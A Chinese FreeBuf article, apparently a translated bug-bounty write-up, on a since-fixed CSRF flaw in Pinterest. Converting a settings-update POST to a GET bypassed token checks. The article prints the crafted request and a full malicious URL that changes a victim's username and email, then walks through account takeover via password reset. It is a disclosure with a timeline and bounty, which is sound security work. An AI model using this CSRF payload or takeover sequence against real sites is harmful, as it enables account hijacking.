@@ -1,0 +1,67 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+**![facebook_share_image.png](https://image.3001.net/images/20190116/1547608137_5c3ea04972466.png!small)**
+**本文分享的是关于美国图片社交网站Pinterest的一个账号劫持漏洞，漏洞原因主要在于可以构造跨站请求伪造(CSRF)攻击，更改任意用户的邮箱ID和用户名，以此实现账号劫持。对于每月有2.5亿活跃用户的Pinterest网站来说，该漏洞影响非常严重。本文的漏洞披露已经Pinterest官方允许，其中提及的账户仅为测试账户。**
+
+Pinterest是美国热门的图片社交网站，Pinterest堪称图片版Twitter，网民可以将感兴趣的图片在Pinterest保存，其他网友可以关注，也可以转发图片。
+
+## 漏洞原因
+
+当我在浏览“<https://www.pinterest.com>”主站时，偶然发现，其中的CSRF令牌（token）通过http头的“X-CSRFToken”进行传输，为了验证CSRF令牌的应用实现机制，我在BurpSuite中构造了以下请求，来对用户的一些设置进行更改。
+
+    
+    
+    POST /_ngjs/resource/UserSettingsResource/update/ HTTP/1.1
+    
+    Host: [www.pinterest.com](http://www.pinterest.com)
+    
+    Content-Type: application/x-www-form-urlencoded
+    
+    X-CSRFToken: <CSRF Token>
+    
+    ……..
+    
+    ……..
+    
+    <POST Parameters>
+
+首先，在以上POST请求中，我尝试着把“X-CSRFToken”头去掉，然后转发出去，反馈回来的响应错误为：“/resource/UserSettingsResource/update/
+didn’t finish after 8 seconds”，也就意味着，这种方式下，CSRF令牌可能正在被验证。
+
+接下来，我把POST请求改为GET请求，并且仍然去掉了”X-CSRFToken”头，并转发出去，这一次反馈回来的响应就是有效的“200 ok” 了。
+
+够明白的了，当把POST请求转变为GET之后，CSRF令牌就不会被Pinterest服务端验证。而且，经我测试发现，Pinterest应用的多个服务端都存在这种CSRF漏洞隐患。
+
+## 账号劫持
+
+由于这是一个基于CSRF的GET请求，基于Pinterest的各种服务端元素，我们要做的就是构造形同以下的一个链接即可，在BurpSuite中可用“change
+request method”选项来方便地构造。
+
+    
+    
+    “https://www.pinterest.com/_ngjs/resource/UserSettingsResource/update/?source_url=%2Fsettings%2F&data=%7B%22options%22%3A%7B%22impressum_url%22%3Anull%2C%22last_name%22%3A%22dummy%22%2C%22custom_gender%22%3Anull%2C%22locale%22%3A%22en-US%22%2C%22has_password%22%3Atrue%2C%22email_settings%22%3A%22Everything+%28except+emails+you%27ve+turned+off%29%22%2C%22news_settings%22%3A%22Activity+from+other+people+on+Pinterest%22%2C%22id%22%3A%22%22%2C%22is_write_banned%22%3Afalse%2C%22first_name%22%3A%22dummyuser%22%2C%22push_settings%22%3A%22Everything+%28except+push+you%27ve+turned+off%29%22%2C%22personalize_from_offsite_browsing%22%3Atrue%2C%22facebook_timeline_enabled%22%3Afalse%2C%22email_changing_to%22%3Anull%2C%22personalize_nux_from_offsite_browsing%22%3Afalse%2C%22is_tastemaker%22%3Afalse%2C%22type%22%3A%22user_settings%22%2C%22 ****%22%2C%22website_url%22%3A%22%22%2C%22location%22%3A%22%22%2C%22 ****%22%2C%22pfy_preference%22%3Atrue%2C%22facebook_publish_stream_enabled%22%3Afalse%2C%22email_bounced%22%3Afalse%2C%22is_partner%22%3Anull%2C%22ads_customize_from_conversion%22%3Atrue%2C%22additional_website_urls%22%3A%5B%5D%2C%22about%22%3A%22test%22%2C%22gender%22%3A%22male%22%2C%22age%22%3Anull%2C%22exclude_from_search%22%3Afalse%2C%22birthdate%22%3Anull%2C%22show_impressum%22%3Afalse%2C%22email_biz_settings%22%3A%22Everything+%28includes+announcements%2C+expert+tips%2C+creative+ideas%2C+and+more%29%22%2C%22country%22%3A%22IN%22%2C%22hide_from_news%22%3Afalse%2C%22collaborative_boards%22%3A%5B%5D%7D%2C%22context%22%3A%7B%7D%7D”
+
+任意Pinterest用户点击以上链接之后，其用户名和注册邮箱会分别被更改为“dummyuser”和“anytestemail@user.com”
+，当然了，anytestemail@user.com是我控制的一个合法邮箱。
+
+以上攻击奏效之后，我再浏览以下Pinterest的密码重置链接：  
+
+> <https://www.pinterest.com/password/reset/>
+
+然后，我登录我控制的这个anytestemail@user.com邮箱，获取到Pinterest发送给我的用户密码重置链接，重置密码，接下来就能用dummyuser用户名和新密码登录受害者账号，完美实现劫持。
+
+## 漏洞上报进程
+
+感谢 Pinterest 安全团队对该漏洞的重视。
+
+> 2018.12.1 漏洞上报
+>
+> 2018.12.7 漏洞分类
+>
+> 2018.12.7 Pinterest发放我$2400美金奖励
+>
+> 2018.12.7 漏洞修复  
+>
+
+ ***参考来源：[infosecflash](http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/)，clouds编译，转载请注明来自FreeBuf.COM**  
+
